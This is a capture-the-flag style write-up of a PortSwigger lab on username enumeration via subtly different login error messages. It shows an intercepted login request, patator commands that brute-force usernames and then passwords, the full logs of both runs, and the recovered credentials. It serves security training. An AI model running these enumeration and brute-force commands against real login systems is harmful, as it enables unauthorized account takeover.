# [Lab 2: Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)

## Description

This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Solution

Browse to the target login form and intercept a login request with BurpSuite to analyze its structure.

```http
POST /login HTTP/1.1
Host: acf31f411f715cd780e02b9c00320053.web-security-academy.net
Cookie: session=WmFSZk9LTCODbtOmOjyDDzLxU07XA3eJ
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: https://acf31f411f715cd780e02b9c00320053.web-security-academy.net
Dnt: 1
Referer: https://acf31f411f715cd780e02b9c00320053.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=tgihf&password=pw
```

Submitting the request with the incorrect username and password combination yields the string `Invalid username or password.` in the response. This is problematic as it is now impossible to determine based on this string whether or not the username alone is valid, since the password is most likely invalid.

However, it may be possible that the developers typed the error message differently when the username is valid. It is worth attempting to enumerate all usernames and ignoring any responses with the string `Invalid username or password.` just to rule out this possibility.

```bash
$ patator http_fuzz url=https://acf31f411f715cd780e02b9c00320053.web-security-academy.net/login method=POST body='username=FILE0&password=pw' 0=users.txt -x ignore:fgrep='Invalid username or password.'

17:23:01 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-04 17:23 CDT
17:23:01 patator    INFO -                                                                              
17:23:01 patator    INFO - code size:clen       time | candidate                          |   num | mesg
17:23:01 patator    INFO - -----------------------------------------------------------------------------
17:23:07 patator    INFO - 200  3291:3104      0.134 | as400                              |    88 | HTTP/1.1 200 OK
17:23:09 patator    INFO - Hits/Done/Skip/Fail/Size: 1/101/0/0/101, Avg: 14 r/s, Time: 0h 0m 7s
```

One of the usernames returned a response that didn't have the `Invalid username or password.` string in it! Instead, it had the string `Invalid username or password `, with a space instead of the full stop at the end. This subtle difference indicates that `as400` is likely a valid username.

Brute force passwords with the username as `as400`. Don't ignore any of the responses as it will be necessary to manually inspect them for the outlier.

```bash
$ patator http_fuzz url=https://acf31f411f715cd780e02b9c00320053.web-security-academy.net/login method=POST body='username=as400&password=FILE0' 0=passwords.txt

17:26:20 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-04 17:26 CDT                                                      
17:26:20 patator    INFO -                                                                                                                                                           
17:26:20 patator    INFO - code size:clen       time | candidate                          |   num | mesg                                                                             
17:26:20 patator    INFO - -----------------------------------------------------------------------------                                                                             
17:26:21 patator    INFO - 200  3292:3105      0.127 | 123456                             |     1 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3280:3093      0.127 | password                           |     2 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3289:3102      0.127 | 12345678                           |     3 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3289:3102      0.122 | qwerty                             |     4 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3280:3093      0.131 | 123456789                          |     5 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3277:3090      0.129 | 12345                              |     6 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3278:3091      0.131 | 1234                               |     7 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3277:3090      0.128 | 1234567                            |     9 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3276:3089      0.129 | 111111                             |     8 | HTTP/1.1 200 OK                                                                  
17:26:21 patator    INFO - 200  3290:3103      0.129 | dragon                             |    10 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3277:3090      0.130 | 123123                             |    11 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3276:3089      0.124 | baseball                           |    12 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3280:3093      0.129 | abc123                             |    13 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3291:3104      0.129 | football                           |    14 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3292:3105      0.125 | monkey                             |    15 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3277:3090      0.126 | letmein                            |    16 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3279:3092      0.126 | shadow                             |    17 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3289:3102      0.130 | master                             |    18 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3278:3091      0.125 | 666666                             |    19 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3279:3092      0.131 | qwertyuiop                         |    20 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3279:3092      0.124 | 123321                             |    21 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3279:3092      0.130 | mustang                            |    22 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3276:3089      0.131 | 1234567890                         |    23 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3280:3093      0.126 | michael                            |    24 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3291:3104      0.130 | 654321                             |    25 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3289:3102      0.124 | superman                           |    26 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3292:3105      0.131 | 1qaz2wsx                           |    27 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3279:3092      0.129 | 7777777                            |    28 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3292:3105      0.130 | 121212                             |    29 | HTTP/1.1 200 OK                                                                  
17:26:22 patator    INFO - 200  3277:3090      0.129 | 000000                             |    30 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3276:3089      0.133 | qazwsx                             |    31 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3279:3092      0.126 | 123qwe                             |    32 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3293:3106      0.126 | killer                             |    33 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3293:3106      0.126 | trustno1                           |    34 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3293:3106      0.126 | jennifer                           |    36 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3280:3093      0.130 | zxcvbnm                            |    37 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3290:3103      0.124 | hunter                             |    39 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3278:3091      0.130 | jordan                             |    35 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3291:3104      0.134 | asdfgh                             |    38 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3290:3103      0.130 | buster                             |    40 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3278:3091      0.130 | soccer                             |    41 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3293:3106      0.129 | harley                             |    42 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3277:3090      0.127 | batman                             |    43 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3293:3106      0.131 | andrew                             |    44 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3276:3089      0.132 | tigger                             |    45 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3289:3102      0.128 | sunshine                           |    46 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3279:3092      0.131 | iloveyou                           |    47 | HTTP/1.1 200 OK                                                                  
17:26:23 patator    INFO - 200  3280:3093      0.132 | 2000                               |    48 | HTTP/1.1 200 OK
17:26:23 patator    INFO - 200  3276:3089      0.123 | charlie                            |    49 | HTTP/1.1 200 OK
17:26:23 patator    INFO - 200  3278:3091      0.132 | robert                             |    50 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3280:3093      0.128 | thomas                             |    51 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3293:3106      0.123 | hockey                             |    52 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3290:3103      0.138 | daniel                             |    54 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3278:3091      0.138 | klaster                            |    56 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3277:3090      0.135 | ranger                             |    53 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3292:3105      0.129 | starwars                           |    55 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3292:3105      0.128 | 112233                             |    57 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3289:3102      0.126 | george                             |    58 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3278:3091      0.124 | computer                           |    59 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3289:3102      0.127 | michelle                           |    60 | HTTP/1.1 200 OK
17:26:24 patator    INFO - 200  3289:3102      0.125 | pepper                             |    62 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3279:3092      0.130 | jessica                            |    61 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3279:3092      0.125 | 1111                               |    63 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3292:3105      0.127 | zxcvbn                             |    64 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3289:3102      0.131 | 11111111                           |    66 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 302  170:0          0.127 | 131313                             |    67 | HTTP/1.1 302 Found
17:26:25 patator    INFO - 200  3292:3105      0.128 | freedom                            |    68 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3291:3104      0.127 | 777777                             |    69 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3292:3105      0.139 | 555555                             |    65 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3279:3092      0.130 | pass                               |    70 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3290:3103      0.128 | maggie                             |    71 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3279:3092      0.127 | 159753                             |    72 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3276:3089      0.130 | aaaaaa                             |    73 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3277:3090      0.128 | ginger                             |    74 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3291:3104      0.136 | princess                           |    75 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3280:3093      0.129 | joshua                             |    76 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3280:3093      0.127 | cheese                             |    77 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3278:3091      0.132 | amanda                             |    78 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3291:3104      0.122 | summer                             |    79 | HTTP/1.1 200 OK
17:26:25 patator    INFO - 200  3293:3106      0.127 | love                               |    80 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3291:3104      0.128 | nicole                             |    82 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3277:3090      0.131 | ashley                             |    81 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3279:3092      0.131 | biteme                             |    84 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3292:3105      0.131 | yankees                            |    87 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3293:3106      0.128 | chelsea                            |    83 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3289:3102      0.125 | matthew                            |    85 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3293:3106      0.130 | access                             |    86 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3278:3091      0.127 | 987654321                          |    88 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3277:3090      0.131 | dallas                             |    89 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3293:3106      0.133 | austin                             |    90 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3276:3089      0.127 | taylor                             |    92 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3276:3089      0.129 | thunder                            |    91 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3292:3105      0.126 | matrix                             |    93 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3280:3093      0.133 | mobilemail                         |    94 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3291:3104      0.125 | mom                                |    95 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3291:3104      0.129 | monitor                            |    96 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3280:3093      0.132 | monitoring                         |    97 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3280:3093      0.126 | montana                            |    98 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3293:3106      0.130 | moon                               |    99 | HTTP/1.1 200 OK
17:26:26 patator    INFO - 200  3290:3103      0.126 | moscow                             |   100 | HTTP/1.1 200 OK
17:26:27 patator    INFO - Hits/Done/Skip/Fail/Size: 100/100/0/0/100, Avg: 15 r/s, Time: 0h 0m 6s
```

The password `131313` returns code 302, whereas all other requests returned code 200. This indicates that it is likely the valid password to username `as400`.

Login with the credential `as400`:`131313` to complete the challenge.